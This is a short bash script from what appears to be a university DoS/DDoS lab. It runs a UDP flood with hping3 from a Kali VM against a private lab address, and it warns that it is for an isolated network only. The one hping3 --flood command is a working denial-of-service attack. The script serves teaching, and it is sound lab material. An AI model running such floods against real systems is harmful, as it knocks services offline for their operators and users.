#!/bin/bash
# ==============================================================
# UDP Flood simulation — CMU-CS 376 DoS/DDoS Lab
# RUN ON: Kali Linux (Attacker) — 192.168.100.10
# TARGET: Windows (Victim) — 192.168.100.20:8000
#
# WARNING: Run only inside an isolated VirtualBox Internal Network
# ("intnet-lab"). Do not use outside of an academic lab context.
# ==============================================================

TARGET_IP="192.168.100.20"
TARGET_PORT=8000

echo "[*] Starting UDP Flood against ${TARGET_IP}:${TARGET_PORT}"
echo "[*] Press Ctrl+C to stop"

# --udp  : send UDP packets instead of TCP
# -p     : destination port (8000)
# --flood: send packets at the maximum possible rate
sudo hping3 --udp -p ${TARGET_PORT} --flood ${TARGET_IP}
